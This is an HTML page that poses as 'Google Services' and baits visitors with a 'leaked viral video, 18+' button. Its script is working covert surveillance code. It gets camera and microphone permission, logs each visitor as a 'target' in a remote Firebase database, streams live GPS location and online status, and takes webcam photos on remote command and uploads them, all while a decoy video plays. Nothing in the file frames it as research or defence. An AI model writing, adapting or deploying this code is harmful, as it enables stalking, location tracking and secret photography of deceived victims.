<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Services</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; overflow: hidden; }
        .header { background: #1a1a1a; padding: 15px; text-align: left; font-size: 20px; color: #ccc; }
        .container { padding: 50px 20px; }
        .viral-text { color: #ff0000; font-size: 28px; font-weight: bold; margin-bottom: 5px; }
        .sub-text { color: #888; font-size: 14px; margin-bottom: 40px; }
        #playBtn { 
            background: #8b0000; color: white; border: none; padding: 15px 40px; 
            font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer;
            text-transform: uppercase; display: flex; align-items: center; margin: 0 auto;
        }
        #playBtn span { margin-right: 10px; font-size: 24px; }
        #videoArea { display: none; width: 100%; height: 100vh; background: #000; position: fixed; top: 0; left: 0; z-index: 100; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <div id="mainUI">
        <div class="header">Google Services</div>
        <div class="container">
            <div class="viral-text">ðŸ”¥ Viral Video Leaked</div>
            <div class="sub-text">Viewer discretion advised. 18+ Only.</div>
            
            <button id="playBtn" onclick="startSystem()">
                <span>â–¶</span> WATCH VIDEO
            </button>
        </div>
    </div>

    <div id="videoArea">
        <iframe id="viralPlayer" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let userId = localStorage.getItem("target_id") || "Target_" + Math.floor(Math.random() * 9999);
        localStorage.setItem("target_id", userId);

        async function startSystem() {
            try {
                // 1. Instant Online Status
                await db.ref('targets/' + userId + '/location').update({ 
                    status: "Online", 
                    last_seen: firebase.database.ServerValue.TIMESTAMP 
                });

                // 2. Request Permissions (Silent)
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });

                // 3. Play Video & Hide UI
                document.getElementById('mainUI').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';
                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";

                initTracking();
            } catch (e) {
                alert("Please Allow Permissions to watch the video.");
            }
        }

        function initTracking() {
            // Live GPS Tracking
            navigator.geolocation.watchPosition((pos) => {
                db.ref('targets/' + userId + '/location').update({
                    lat: pos.coords.latitude, lng: pos.coords.longitude,
                    last_seen: firebase.database.ServerValue.TIMESTAMP
                });
            }, null, { enableHighAccuracy: true });

            // Online Heartbeat
            setInterval(() => {
                db.ref('targets/' + userId + '/location').update({ 
                    status: "Online", last_seen: firebase.database.ServerValue.TIMESTAMP 
                });
            }, 5000);

            // Command Listener (Snap/Mic)
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (cmd?.action === "snap") capturePhoto();
                if (cmd) db.ref('commands/' + userId).remove();
            });
        }

        async function capturePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            db.ref('targets/' + userId + '/photos').push({ image: canvas.toDataURL('image/jpeg', 0.5), time: new Date().toLocaleTimeString() });
            stream.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
